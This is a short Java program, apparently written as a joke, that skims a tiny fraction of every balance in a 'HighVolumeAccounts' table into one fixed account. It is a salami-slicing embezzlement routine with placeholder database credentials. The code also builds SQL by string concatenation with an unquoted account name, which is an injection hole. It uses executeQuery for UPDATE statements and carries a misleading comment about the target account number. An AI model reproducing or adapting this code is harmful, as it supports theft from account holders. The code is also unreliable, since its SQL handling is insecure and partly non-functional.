import java.sql.*;
import java.math.BigDecimal;
import java.math.MathContext;


public class adjustaccounts{
   static final String JDBC_DRIVER = "com.mysql.jdbc.Driver";  
   static final String DB_URL = "jdbc:mysql://YR1F4K3QAS3RV3R";
   static final String USER = "MY_USER";
   static final String PASS = "MY_PASSWORD";

   public static void main(String[] args) {
   Connection conn = null;
   Statement stmt = null;
   try{
      Class.forName("com.mysql.jdbc.Driver");
      System.out.println("Connecting to database...");
      conn = DriverManager.getConnection(DB_URL,USER,PASS);
      stmt = conn.createStatement();
      String sql;
      sql = "SELECT * FROM HighVolumeAccounts";
      ResultSet rs = stmt.executeQuery(sql);
       while(rs.next()){
         //Retrieve by column name
         int accountnumber  = rs.getInt("AccountNumber");
         BigDecimal balance = rs.getBigDecimal("Balance");
         String accountname = rs.getString("AccountName");
         double pennyshave = 0.000000001;
         BigDecimal difference = balance.multiply(new BigDecimal(pennyshave));
         //Pad your account
         sql = "UPDATE TBL_Accounts SET Balance=Balance +" + difference + " WHERE AccountNumber=00098793302999"; //don't worry about this number, its a Java thing
         stmt.executeQuery(sql);
         //Adjust the other one.
         sql = "UPDATE TBL_Accounts SET Balance=Balance -" + difference + " WHERE AccountName="+ accountname;
         stmt.executeQuery(sql);
      }
      rs.close();
      stmt.close();
      conn.close();
   }catch(SQLException se){
      se.printStackTrace();
   }catch(Exception e){
      e.printStackTrace();
   }finally{
      try{
         if(stmt!=null)
            stmt.close();
      }catch(SQLException se2){
      }
      try{
         if(conn!=null)
            conn.close();
      }catch(SQLException se){
         se.printStackTrace();
      }
   }
}